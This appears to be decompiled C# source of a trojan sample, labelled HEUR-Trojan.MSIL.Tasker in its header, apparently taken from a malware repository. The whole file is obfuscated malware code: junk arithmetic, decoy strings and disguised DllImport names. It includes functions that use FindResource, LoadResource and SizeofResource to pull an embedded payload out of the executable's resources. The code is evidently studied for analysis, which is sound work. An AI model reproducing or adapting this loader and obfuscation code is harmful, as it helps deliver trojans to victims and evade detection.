// Decompiled with JetBrains decompiler
// Type: ResourceSetType
// Assembly: dfkmldklAF, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 52B1A80D-F2BA-4C56-AF2D-3BD38285EC79
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-e36b2fe70c40908fbd6bd5b3165eeb60f4b98a5cc90e25e0dd382be9900cdb6b.exe

using System;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

internal class ResourceSetType
{
  private static Task<int> CalcVaListSize()
  {
    // ISSUE: variable of a compiler-generated type
    ResourceSetType.AddCharClass stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.Era = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u003CGetGacInfos\u003Ed__53 = Convert.ToInt32(-50299.5 - 50299.5) + Convert.ToInt32(38580.0 + Math.Round(38580.0)) / \u003CModule\u003E.Get_EndOfStream(int.Parse("1")) + Convert.ToInt32(2.0 * 11719.0) / \u003CModule\u003E.Get_EndOfStream(int.Parse("12"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.Era.Start<ResourceSetType.AddCharClass>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.Era.Task;
  }

  private static Task<int> IL()
  {
    // ISSUE: variable of a compiler-generated type
    ResourceSetType.Runstack stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.InternalAddTypeToken = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.EfiRom = Convert.ToInt32(14422.5 - 4807.5) / \u003CModule\u003E.Get_EndOfStream(int.Parse("5")) + Convert.ToInt32(65732.253795821278 - Math.Sin(32866.5)) / \u003CModule\u003E.Get_EndOfStream(int.Parse("2")) - Convert.ToInt32(113024.0 - Math.Ceiling(37674.5)) / \u003CModule\u003E.Get_EndOfStream(int.Parse("6"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.InternalAddTypeToken.Start<ResourceSetType.Runstack>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.InternalAddTypeToken.Task;
  }

  private static Task<int> GetGenericVariableIndex()
  {
    // ISSUE: variable of a compiler-generated type
    ResourceSetType.ContiguousRidList stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.FIND_FROMSTART = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.InternalFree = Convert.ToInt32(-1493.0 - 1493.0) + Convert.ToInt32(4831543300.5 / 49150.5) / \u003CModule\u003E.Get_EndOfStream(int.Parse("7")) - Convert.ToInt32(142974.0 - Math.Abs(47658.0)) / \u003CModule\u003E.Get_EndOfStream(int.Parse("6"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.FIND_FROMSTART.Start<ResourceSetType.ContiguousRidList>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.FIND_FROMSTART.Task;
  }

  private static Task<int> ReorderArgumentArray()
  {
    // ISSUE: variable of a compiler-generated type
    ResourceSetType.IsEnum stateMachine;
    // ISSUE: reference to a compiler-generated field
    stateMachine.Get_IsNonVariant = AsyncTaskMethodBuilder<int>.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.Name = (int.Parse("-1568006271") ^ int.Parse("1568108688")) + Convert.ToInt32(42156.0 + Math.Floor(42156.0)) / \u003CModule\u003E.Get_EndOfStream(int.Parse("9")) + Convert.ToInt32(41931.0 + Math.Truncate(41931.0)) / \u003CModule\u003E.Get_EndOfStream(int.Parse("4"));
    // ISSUE: reference to a compiler-generated field
    stateMachine.Get_IsNonVariant.Start<ResourceSetType.IsEnum>(ref stateMachine);
    // ISSUE: reference to a compiler-generated field
    return stateMachine.Get_IsNonVariant.Task;
  }

  public static void Request()
  {
    Task<int> task = \u003CModule\u003E.\u0030ä\u009B\u005Er();
    \u003CModule\u003E.\u003B\u0010\u0025Û\u009E("Taikkkkkkkkkkkiuiiokkkkkkkkkkd");
    string str1 = \u003CModule\u003E.g\u001A\u0090Eº();
    \u003CModule\u003E.\u003B\u0010\u0025Û\u009E(\u003CModule\u003E.\u00A5\u00ABèÜ\u00B1("The flow of the program is resumed once the task is completed by the asynchronous method and the value is returned ", str1));
    \u003CModule\u003E.\u003B\u0010\u0025Û\u009E("The programl file to count the number of characters in the file");
    int result = task.Result;
    string str2 = \u003CModule\u003E.g\u001A\u0090Eº();
  }

  [DllImport("kgdffsdfsdfsdfsdfsdgdff#", EntryPoint = "fgfsdfsdfdsffdfgfda", SetLastError = true)]
  private static extern IntPtr PercentPositivePattern(IntPtr _param0, IntPtr _param1);

  [DllImport("#fdsf#", EntryPoint = "LoadResource")]
  private static extern IntPtr MethodBodyToken(IntPtr _param0, IntPtr _param1);

  [DllImport("#dsd.dll#", EntryPoint = "GetModuleHandle", SetLastError = true)]
  private static extern IntPtr GroupNumberFromName(string _param0);

  [DllImport("#dgsdsdgfg.dpolpll#", EntryPoint = "FindResource", SetLastError = true)]
  private static extern IntPtr OnRemove(IntPtr _param0, string _param1, string _param2);

  [DllImport("#fdsdd.pdll#", EntryPoint = "dg")]
  private static extern IntPtr M_argsMap(string _param0);

  [DllImport("#fsdfsdsddgd#", EntryPoint = "gshfdfdsdsdfdsdlkolfsdfgsdg", SetLastError = true)]
  private static extern IntPtr CompareEraRanges(
    IntPtr _param0,
    string _param1,
    string _param2);

  [DllImport("#gfsddsfd.dll#", EntryPoint = "gshfsddfpfdhddgdsg")]
  private static extern IntPtr Get_Group(string _param0);

  [DllImport("#gfssddff.dll#", EntryPoint = "drdseg")]
  private static extern IntPtr GetObjectFromMode(string _param0);

  [DllImport("#gdsdsdfsdfdssgdhfdggggggdkksg.dll#", EntryPoint = "gddgldsgsdsdfhsg")]
  private static extern IntPtr _Build(string _param0);

  [DllImport("#gsfhsdfsdsdfgsdgdgsdgf;ddg.dll#", EntryPoint = "SizeofResource", SetLastError = true)]
  private static extern uint IncludeSect(IntPtr _param0, IntPtr _param1);

  [DllImport("#gsdfgsdfddsdfgfgsd.dll#", EntryPoint = "fsdddf", SetLastError = true)]
  private static extern IntPtr IsNestedAssembly(
    IntPtr _param0,
    string _param1,
    string _param2);

  public static byte[] Get_Layout(string _param0, string _param1)
  {
    IntPtr num1 = \u003CModule\u003E.\u001D\u003B\u0094p\u00B3(\u003CModule\u003E.\u0091r\u0028qò(\u003CModule\u003E.\u005D\u00B2\u0013\u002C_()));
    IntPtr num2 = \u003CModule\u003E.\u000Fpjòt(num1, _param0, _param1);
    IntPtr num3 = \u003CModule\u003E.J\u0017Ud\u009C(num1, num2);
    uint length = \u003CModule\u003E.\u0001ÿ\u000F\u0016õ(num1, num2);
    byte[] layout = new byte[(IntPtr) length];
    \u003CModule\u003E.íg\u00B9N\u0016(num3, layout, Convert.ToInt32(-68484.0 - 68484.0) + Convert.ToInt32(52309.915216833579 - Math.Tan(26154.5)) / \u003CModule\u003E.Get_EndOfStream(int.Parse("5")) + Convert.ToInt32(84660.0 - Math.Tanh(42329.5)) / \u003CModule\u003E.Get_EndOfStream(int.Parse("10")) - Type.EmptyTypes.Length - Type.EmptyTypes.Length, (int) length);
    return layout;
  }

  public static byte[] COR_E_INVALIDPROGRAM(string _param0, string _param1)
  {
    ResourceManager resourceManager = (ResourceManager) \u003CModule\u003E.Z\u00A2ÎCd(_param1, \u003CModule\u003E.\u005D\u00B2\u0013\u002C_());
    return (byte[]) \u003CModule\u003E.\u0018ø\u003FjÈ((object) resourceManager, _param0);
  }
}
